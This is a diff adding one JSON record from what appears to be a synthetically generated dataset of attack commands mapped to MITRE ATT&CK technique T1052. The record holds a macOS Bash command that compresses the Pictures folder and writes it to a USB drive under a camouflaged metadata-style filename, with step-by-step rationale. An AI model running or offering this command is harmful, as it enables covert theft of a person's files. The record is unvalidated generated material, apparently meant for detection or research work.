@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/Pictures\" | dd of=\"/Volumes/USB32/.photoindex.db\" bs=4m conv=sync,noerror && sync && diskutil unmount \"/Volumes/USB32\"",
+  "explanation": "Compresses the Pictures folder and writes it to a database-looking file on the external drive using dd, then unmounts for quick removal.",
+  "rationale_steps": [
+    "Aggregate image files into a single compressed stream.",
+    "Write the stream directly to the USB device via dd.",
+    "Name the output to resemble an internal metadata file for camouflage.",
+    "Flush and unmount to complete the offline transfer."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-c5593608",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
